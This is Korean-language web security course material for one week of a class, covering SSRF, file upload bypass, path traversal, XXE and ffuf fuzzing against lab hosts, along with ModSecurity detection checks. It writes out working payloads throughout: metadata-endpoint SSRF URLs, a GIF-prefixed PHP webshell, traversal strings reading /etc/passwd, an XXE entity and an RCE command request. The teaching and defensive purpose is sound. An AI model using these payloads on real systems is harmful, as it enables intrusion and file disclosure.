# Week 07 — OWASP A10 + A05 + A03 — SSRF / 파일 업로드 / 경로 탐색

> 본 주차는 OWASP A10 (SSRF) + A05 (Security Misconfiguration / 파일 업로드) +
> A03 (Path Traversal). admin.6v6.lab + govportal.6v6.lab + ffuf 사용.

## 학습 목표

1. SSRF (Server-Side Request Forgery) 의 동작 + 우회
2. 파일 업로드 검증 우회 (확장자 / Content-Type / Magic Bytes)
3. Path Traversal (..%2f / null byte)
4. ffuf 으로 파일 업로드 + LFI fuzzing
5. ATT&CK + CWE 매핑

## 1. SSRF

서버가 사용자 입력으로 외부 URL 요청 → 내부 자원 접근.

```
# 정상
POST /api/fetch  body={url: "https://api.example.com/data"}

# SSRF
POST /api/fetch  body={url: "http://localhost/admin"}   # 내부 admin
POST /api/fetch  body={url: "http://169.254.169.254/"}  # AWS metadata
POST /api/fetch  body={url: "file:///etc/passwd"}        # file scheme
```

우회 패턴:
- URL encoding: `http%3A%2F%2Flocalhost`
- IP 변형: `127.0.0.1` / `127.1` / `0x7f000001` / `2130706433`
- DNS rebinding (시간차)

## 2. 파일 업로드

### 2.1 확장자 우회

```
shell.php       → blacklist 차단
shell.phtml     → 우회 가능
shell.php5
shell.php.jpg   → MIME 우회
shell.php%00.jpg # null byte (legacy)
```

### 2.2 Content-Type 우회

```
Content-Type: image/jpeg   # 헤더만 가짜
```

### 2.3 Magic Bytes 우회

```
GIF89a<?php system($_GET['c']); ?>
```

파일 시작이 GIF magic bytes 라 검증 통과.

## 3. Path Traversal

```
GET /api/file?path=../../../etc/passwd
GET /api/file?path=..%2f..%2f..%2fetc%2fpasswd       # URL encode
GET /api/file?path=....//....//....//etc/passwd      # 우회
GET /api/file?path=../etc/passwd%00.jpg              # null byte
```

## 4. ffuf fuzzing

```
# path 단어 fuzz
ffuf -u http://target/FUZZ -w wordlist.txt

# parameter 값 fuzz
ffuf -u http://target/?id=FUZZ -w num.txt

# header 값 fuzz
ffuf -u http://target -H "User-Agent: FUZZ" -w ua.txt
```

## 5. 실습 1~5

### 1 — admin.6v6.lab RCE 시도

```bash
# admin.6v6.lab 는 RCE / XXE 의도 vuln 사이트
#   /api/run?cmd=id → 서버가 user 입력을 system() 으로 그대로 실행 (취약)
#   응답: uid=0(root) gid=0(root) (RCE 성공) 또는 403 (ModSec 932 차단)
ssh 6v6-attacker 'curl -s -H "Host: admin.6v6.lab" \
    "http://10.20.30.1/api/run?cmd=id" 2>&1 | head'
# 운영 측 detection: ModSec 932xxx RCE 룰 + Wazuh agent 의 audit ingest
```

### 2 — Path Traversal

```bash
# 기본 path traversal
ssh 6v6-attacker 'curl -s -o /dev/null -w "기본: %{http_code}\n" \
    -H "Host: juice.6v6.lab" \
    "http://10.20.30.1/?file=../../../etc/passwd"'

# URL encoding 우회 — %2e%2e%2f = ../
#   ModSec 의 단순 string match 회피 시도. CRS 의 URL decode 후 매칭 정상.
ssh 6v6-attacker 'curl -s -o /dev/null -w "URL-enc: %{http_code}\n" \
    -H "Host: juice.6v6.lab" \
    "http://10.20.30.1/?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"'

# 추가 변형 — null byte (legacy PHP)
ssh 6v6-attacker 'curl -s -o /dev/null -w "null byte: %{http_code}\n" \
    -H "Host: juice.6v6.lab" \
    "http://10.20.30.1/?file=../etc/passwd%00.jpg"'

# 예상 응답:
#   403 (ModSec 930 LFI 차단) — 정상 방어
#   200 (차단 안 됨) — paranoia 설정 부족 → 룰 강화 필요
```

### 3 — XXE (XML External Entity)

```bash
# XXE 페이로드 — XML 의 외부 엔티티 (ENTITY xxe SYSTEM "file:///etc/passwd")
#   파싱 시 file:// 의 내용을 응답에 포함 → 시스템 파일 노출
#   Content-Type: application/xml 필수 (server 의 XML 파서 실행)
ssh 6v6-attacker 'curl -s -X POST \
    -H "Host: admin.6v6.lab" \
    -H "Content-Type: application/xml" \
    -d "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>" \
    http://10.20.30.1/api/parse 2>&1 | head'
# 응답 = /etc/passwd 내용 (취약) 또는 403 (ModSec 921xxx 차단)
# 운영 권장: XML parser 의 외부 엔티티 비활성 (DOCTYPE_PROCESSING=disabled)
```

### 4 — ffuf 경로 fuzz

```bash
# ffuf — modern fuzzing 도구 (gobuster / dirb 대안)
#   -u "http://.../FUZZ": FUZZ 위치에 wordlist 의 단어 대체
#   -H "Host: ...": HAProxy vhost
#   -w wordlist: 단어 list
#   -mc 200,302: 출력 filter (matched code 200/302 만)
#   -fc 403: 403 응답 제외 (ModSec 차단 침묵)
#   timeout 30: ffuf 가 무한 fuzzing 방지
ssh 6v6-attacker 'timeout 30 ffuf -u "http://10.20.30.1/FUZZ" \
    -H "Host: juice.6v6.lab" \
    -w /usr/share/dirb/wordlists/common.txt \
    -mc 200,302 2>&1 | head -20' || true
# 예상 출력 (juiceshop):
#   /api/Users  [Status: 200, Size: 1234]
#   /api/Products [Status: 200, ...]
#   /admin [Status: 200, ...]  ← 핵심 발견
```

### 5 — ModSec 차단 패턴

```bash
# 위 4 실습의 audit log 확인 — 930xxx (LFI) + 932xxx (RCE) 매치
#   .transaction.messages[] : 매치된 룰 list
#   select(.id | startswith("930") or startswith("932")) : 카테고리 filter
#   {id, msg}: id + 사람이 읽는 메시지만 추출
ssh 6v6-web 'sudo tail -3 /var/log/apache2/modsec_audit.log | head -1 | \
    jq ".transaction.messages[] | select(.id | startswith(\"930\") or startswith(\"932\")) | {id, msg}"'
# 예상 출력 (LFI):
#   {"id":"930100","msg":"Path Traversal Attack (/../) (matched Pattern: ../)"}
#   {"id":"930120","msg":"OS File Access Attempt (Linux)"}
```

## 6. 과제

A. 3 카테고리 페이로드 (필수) — SSRF / 파일업로드 / Path Traversal 각 2 변형
B. ffuf 결과 (심화) — 발견 endpoint 5+
C. ModSec 차단 비율 (정성)

## 7. W08 (중간고사) 예고

CTF 형식 90분 시험. 8 vuln 사이트 중 무작위 3 challenge.
